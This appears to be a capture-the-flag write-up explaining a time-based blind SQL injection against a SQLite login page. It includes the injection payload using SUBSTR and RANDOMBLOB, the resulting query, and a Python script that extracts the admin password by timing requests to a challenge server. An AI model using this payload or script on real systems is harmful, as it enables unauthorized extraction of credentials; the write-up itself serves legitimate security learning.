let's look at the source code

wow! theres sql! this is sql injection!

i hope none of yall managed to figure out how to bypass the filter (string concat ahem ahem)

but anyways notice how the flag is literally the password of the admin 

...but you cannot log in under any circumstances?? there arent even any error messages????

well turns out we can still find the flag, using an sql time attack

the idea is 

1) check 1 character of the password
2) if we correctly guess that character, make the program spend a long time thinking
3) if we see that the program spent a long time thinking, we know that the character we guessed is correct
4) repeat for all characters in the flag

the challenge states that the flag only consists of curly braces, underscores, lowercase alphabets, and numbers, so our alphabet looks like this

```
abcdefghijklmnopqrstuvwxyz1234567890{}
```

but how will we craft our payload?

we can utilize 2 functions in sql: ```SUBSTR()``` and ```RANDOMBLOB()```

```SUBSTR()``` take in 3 parameters: variable, position, length

in python terms its ```variable[position:position+length]```

```RANDOMBLOB()``` generates pseudo-random bytes of some length, and will be quite slow if the length is huge

so, let's craft our payload

```sql
' OR (substr(password,1,1)='a' AND randomblob(1000000000)) --
```

the full sql query will end up looking something like this:

```sql
SELECT * FROM users WHERE username = '{username}' AND password = '' OR (substr(password,1,1)='a' AND randomblob(1000000000)) --'
```

this checks if the first character of the variable password is 'a', and if it is, randomblob is called and the website takes a longer time to return

for the whole brute-forcing script:

```py
import requests
import time

chars = "abcdefghijklmnopqrstuvwxyz}{_13457"
flag = ""
for i in range(9,1000):
    clist = []
    for c in chars:
        start = time.time()
        requests.post("http://159.223.73.72:3957/", data={"username": "admin", "password": f"' OR (substr(password,{i+1},1)='{c}' AND randomblob(1000000000)) --"})
        clist.append((time.time()-start, c)) # duration, character
    clist.sort(reverse=True)
    flag+=clist[0][1] # character that took the longest for a request to complete
    print(flag)
print(flag)

```

this will keep running until we reach '}', where we can stop running the code

each request takes about 0.3 seconds to run, depending on your connection, and if the guess is correct, the request will take around 4 seconds to complete

in total, this code should not take more than 5 minutes to get the flag

flag: deadbeef{r34l_t1m3}
